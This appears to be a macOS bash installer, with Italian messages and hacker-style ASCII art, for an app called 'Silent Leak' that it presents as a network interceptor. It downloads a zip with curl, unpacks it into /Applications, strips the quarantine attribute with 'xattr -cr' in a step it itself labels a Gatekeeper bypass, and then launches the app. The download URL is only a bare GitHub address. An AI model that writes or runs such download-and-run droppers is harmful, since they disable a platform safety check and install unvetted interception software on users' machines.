#!/bin/bash

GREEN='\033[38;5;46m'
DARK_GREEN='\033[38;5;28m'
CYAN='\033[38;5;51m'
WHITE='\033[1;37m'
RED='\033[38;5;196m'
DIM='\033[2m'
BOLD='\033[1m'
NC='\033[0m'

tput civis
trap 'tput cnorm' EXIT

clear

echo -e "${DARK_GREEN}╔══════════════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${DARK_GREEN}║${NC} ${BOLD}${GREEN}● SYSTEM ONLINE${NC}                      ${DIM}KERNEL: DARWIN // ARCH: UNIVERSAL${NC} ${DARK_GREEN}║${NC}"
echo -e "${DARK_GREEN}╠══════════════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${DARK_GREEN}║${GREEN}                                                                          ${DARK_GREEN}║${NC}"
echo -e "${DARK_GREEN}║${GREEN}      ███████╗██╗██╗     ███████╗███╗   ██╗████████╗                      ${DARK_GREEN}║${NC}"
echo -e "${DARK_GREEN}║${GREEN}      ██╔════╝██║██║     ██╔════╝████╗  ██║╚══██╔══╝                      ${DARK_GREEN}║${NC}"
echo -e "${DARK_GREEN}║${GREEN}      ███████╗██║██║     █████╗  ██╔██╗ ██║   ██║                         ${DARK_GREEN}║${NC}"
echo -e "${DARK_GREEN}║${GREEN}      ╚════██║██║██║     ██╔══╝  ██║╚██╗██║   ██║                         ${DARK_GREEN}║${NC}"
echo -e "${DARK_GREEN}║${GREEN}      ███████║██║███████╗███████╗██║ ╚████║   ██║                         ${DARK_GREEN}║${NC}"
echo -e "${DARK_GREEN}║${GREEN}      ╚══════╝╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝                         ${DARK_GREEN}║${NC}"
echo -e "${DARK_GREEN}║${GREEN}      ██╗     ███████╗ █████╗ ██╗  ██╗                                    ${DARK_GREEN}║${NC}"
echo -e "${DARK_GREEN}║${GREEN}      ██║     ██╔════╝██╔══██╗██║ ██╔╝   ${WHITE}// NETWORK INTERCEPTOR v1.0${GREEN}    ${DARK_GREEN}║${NC}"
echo -e "${DARK_GREEN}║${GREEN}      ██║     █████╗  ███████║█████╔╝    ${DIM}// TRAFFIC TELEMETRY SUITE${GREEN}     ${DARK_GREEN}║${NC}"
echo -e "${DARK_GREEN}║${GREEN}      ██║     ██╔══╝  ██╔══██║██╔═██╗                                     ${DARK_GREEN}║${NC}"
echo -e "${DARK_GREEN}║${GREEN}      ███████╗███████╗██║  ██║██║  ██╗                                    ${DARK_GREEN}║${NC}"
echo -e "${DARK_GREEN}║${GREEN}      ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝                                    ${DARK_GREEN}║${NC}"
echo -e "${DARK_GREEN}║${GREEN}                                                                          ${DARK_GREEN}║${NC}"
echo -e "${DARK_GREEN}╚══════════════════════════════════════════════════════════════════════════╝${NC}"
echo ""

step_bar() {
    local msg="$1"
    echo -ne "  ${CYAN}⚡${NC} ${WHITE}${msg}${NC}\n"
    echo -ne "     ${DARK_GREEN}["
    for i in {1..30}; do
        echo -ne "${GREEN}█"
        sleep 0.02
    done
    echo -e "${DARK_GREEN}] ${GREEN}100%${NC}\n"
}

step_bar "Connessione al nodo remoto GitHub..."

URL="https://github.com"
curl -sL "$URL" -o /tmp/SL.zip

if [ ! -f /tmp/SL.zip ] || [ $(wc -c < /tmp/SL.zip) -lt 1000 ]; then
    echo -e "  ${RED}✖ [ERRORE CRITICO] Impossibile scaricare il pacchetto dal server.${NC}"
    exit 1
fi

step_bar "Estrazione moduli crittografati e telemetria..."
unzip -q -o /tmp/SL.zip -d /tmp/SL_ext

step_bar "Installazione eseguibile in /Applications..."
rm -rf "/Applications/Silent Leak.app" "/Applications/SilentLeak.app"
mv /tmp/SL_ext/*.app /Applications/ 2>/dev/null

step_bar "Bypass protocolli di sicurezza macOS (Gatekeeper)..."
xattr -cr "/Applications/Silent Leak.app" 2>/dev/null || xattr -cr "/Applications/SilentLeak.app" 2>/dev/null
rm -rf /tmp/SL.zip /tmp/SL_ext

echo -e "${DARK_GREEN}╔══════════════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${DARK_GREEN}║${NC}  ${BOLD}${GREEN}✔ INSTALLAZIONE COMPLETATA! Avvio di Silent Leak in corso...${NC}           ${DARK_GREEN}║${NC}"
echo -e "${DARK_GREEN}╚══════════════════════════════════════════════════════════════════════════╝${NC}"
echo ""

sleep 1
open -a "Silent Leak" 2>/dev/null || open -a "Silent Leak"
